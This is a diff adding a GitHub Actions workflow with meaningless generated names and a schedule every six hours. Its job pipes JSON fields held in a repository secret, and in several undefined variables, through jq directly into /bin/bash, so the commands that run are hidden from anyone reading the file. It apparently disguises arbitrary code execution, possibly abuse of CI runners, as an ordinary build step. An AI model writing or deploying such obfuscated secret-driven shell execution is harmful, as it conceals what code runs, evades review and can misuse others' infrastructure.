@@ -1,0 +1,24 @@
+name: gaoqianyu5647
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gaoqianyu5647
+        env:
+          vxbs5145: ${{ secrets.vxbs5145 }}
+        run: |
+          echo $vxbs5145 | jq -r .qi04851 | /bin/bash
+          echo $d5 | jq -r .ns91908 | /bin/bash
+          echo $mlb574 | jq -r .ck21 | /bin/bash
+          echo $rp719 | jq -r .srobl649 | /bin/bash
+          echo $kqfiw2772 | jq -r .sc676 | /bin/bash
+          echo $lmyc912 | jq -r .pfizv77 | /bin/bash
+          echo $ijcu7 | jq -r .ncfsu592 | /bin/bash
+          echo $gn0830 | jq -r .ch475 | /bin/bash
+
